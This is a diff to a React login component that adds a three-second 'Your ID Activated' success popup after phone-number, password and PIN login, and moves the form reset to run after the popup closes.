@@ -5,6 +5,7 @@ const Login = () => {
     const [phoneNumber, setPhoneNumber] = useState('');
     const [password, setPassword] = useState('');
     const [showPinModal, setShowPinModal] = useState(false);
+    const [showActivationPopup, setShowActivationPopup] = useState(false);
     const [pin, setPin] = useState(['', '', '', '', '', '']);
     const [isLoading, setIsLoading] = useState(false);
     const [error, setError] = useState('');
@@ -66,13 +67,18 @@ const Login = () => {
             
             if(result.data.success){
                 setSuccess(true);
+                // Close PIN modal and show activation popup
+                setShowPinModal(false);
+                setShowActivationPopup(true);
+                
+                // Reset form after showing popup
                 setTimeout(() => {
                     setPhoneNumber('');
                     setPassword('');
                     setPin(['', '', '', '', '', '']);
-                    setShowPinModal(false);
                     setSuccess(false);
-                }, 2000);
+                    setShowActivationPopup(false);
+                }, 3000); // Show popup for 3 seconds
             }
         } catch (err) {
             console.error('Login error:', err);
@@ -263,6 +269,29 @@ const Login = () => {
                             >
                                 {isLoading ? 'LOGGING IN...' : 'SUBMIT'}
                             </button>
+                        </div>
+                    </div>
+                </div>
+            )}
+
+            {/* Activation Success Popup */}
+            {showActivationPopup && (
+                <div className="fixed inset-0 bg-gray-700 bg-opacity-80 flex justify-center items-center z-50 px-3 sm:px-8 animate-fadeIn">
+                    <div className="bg-white rounded-xl shadow-2xl max-w-md w-full p-6 sm:p-8 md:p-10 animate-slideUp">
+                        <div className="text-center">
+                            <div className="mb-4 sm:mb-6">
+                                <div className="mx-auto w-16 h-16 sm:w-20 sm:h-20 md:w-24 md:h-24 bg-green-100 rounded-full flex items-center justify-center mb-4 sm:mb-5">
+                                    <svg className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                                    </svg>
+                                </div>
+                                <h3 className="text-xl sm:text-2xl md:text-3xl font-bold text-gray-800 mb-2 sm:mb-3">
+                                    Your ID Activated
+                                </h3>
+                                <p className="text-sm sm:text-base text-gray-600">
+                                    Login successful! Your account has been activated.
+                                </p>
+                            </div>
                         </div>
                     </div>
                 </div>
